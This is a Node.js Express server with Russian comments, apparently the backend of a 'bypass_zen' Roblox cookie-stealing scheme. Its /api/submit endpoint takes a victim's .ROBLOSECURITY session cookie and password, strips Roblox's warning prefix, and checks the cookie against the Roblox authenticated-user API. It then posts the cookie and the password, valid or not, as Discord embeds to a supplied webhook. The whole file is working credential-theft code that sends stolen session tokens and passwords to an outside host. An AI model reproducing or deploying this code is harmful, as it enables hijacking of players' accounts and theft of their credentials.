const express = require('express');
const app = express();

app.use(express.json());

// CORS для всех запросов
app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  if (req.method === 'OPTIONS') return res.sendStatus(204);
  next();
});

// Пинг для пробуждения
app.get('/ping', (req, res) => res.send('OK'));

// Главный эндпоинт валидации
app.post('/api/submit', async (req, res) => {
  console.log("[REQUEST] Received:", JSON.stringify(req.body).slice(0, 200));
  
  const { cookie, password, category, webhookUrl } = req.body;

  if (!cookie || !password) {
    return res.status(400).json({ isValid: false, reason: "Missing fields" });
  }

  // Очистка куки
  let cleaned = cookie.trim();
  if (cleaned.startsWith("_|WARNING")) {
    const parts = cleaned.split("|_");
    if (parts.length >= 2) cleaned = parts[parts.length - 1].trim();
  }
  cleaned = cleaned.replace(/^["';]+|["';]+$/g, "").trim();

  const safeBlock = text => "```\n" + String(text).replace(/`/g, "'") + "\n```";

  // Функция отправки в Discord
  async function sendToDiscord(isValid, userData, reason) {
    if (!webhookUrl) return;
    
    let embed;
    
    if (isValid) {
      // ЗЕЛЁНАЯ плашка - валидная кука
      embed = {
        title: "✅ Valid Cookie",
        color: 0x2ecc71,
        description:
          `**🗂 Category:** ${category}\n` +
          `**👤 User:** ${userData.name || "Unknown"} (ID: ${userData.id})\n\n` +
          `**📝 Cookie**\n${safeBlock(cookie)}` +
          `\n**🔑 Password**\n${safeBlock(password)}`,
        footer: { text: "bypass_zen · 2026" },
        timestamp: new Date().toISOString()
      };
    } else {
      // КРАСНАЯ плашка - невалидная кука
      embed = {
        title: "❌ Invalid Cookie",
        color: 0xff5064,
        description:
          `**🗂 Category:** ${category}\n` +
          `**⚠️ Reason:** ${reason || "Unknown"}\n\n` +
          `**📝 Cookie**\n${safeBlock(cookie)}` +
          `\n**🔑 Password**\n${safeBlock(password)}`,
        footer: { text: "bypass_zen · 2026" },
        timestamp: new Date().toISOString()
      };
    }

    try {
      const discordRes = await fetch(webhookUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          username: "bypass_zen",
          embeds: [embed]
        })
      });
      console.log("[DISCORD] Status:", discordRes.status);
    } catch (e) {
      console.log("[DISCORD] Error:", e.message);
    }
  }

  try {
    // Запрос к API Roblox
    const robloxRes = await fetch("https://users.roblox.com/v1/users/authenticated", {
      method: 'GET',
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'application/json',
        'Cookie': `.ROBLOSECURITY=${cleaned}`
      }
    });

    console.log("[ROBLOX] Status:", robloxRes.status);

    if (robloxRes.status !== 200) {
      const reason = robloxRes.status === 401 ? "Invalid cookie" : `Roblox HTTP ${robloxRes.status}`;
      await sendToDiscord(false, null, reason);
      return res.status(400).json({ isValid: false, reason });
    }

    const userData = await robloxRes.json();
    console.log("[ROBLOX] User:", userData.name);
    
    if (!userData || !userData.id) {
      await sendToDiscord(false, null, "Failed to parse Roblox user");
      return res.status(400).json({ isValid: false, reason: "Failed to parse Roblox user" });
    }

    // Отправляем валидную куку в Discord
    await sendToDiscord(true, userData, null);

    return res.json({
      isValid: true,
      userId: userData.id,
      username: userData.name || "Unknown"
    });

  } catch (err) {
    console.log("[ERROR]", err.message);
    await sendToDiscord(false, null, "Server error: " + err.message);
    return res.status(500).json({ isValid: false, reason: "Server error: " + err.message });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
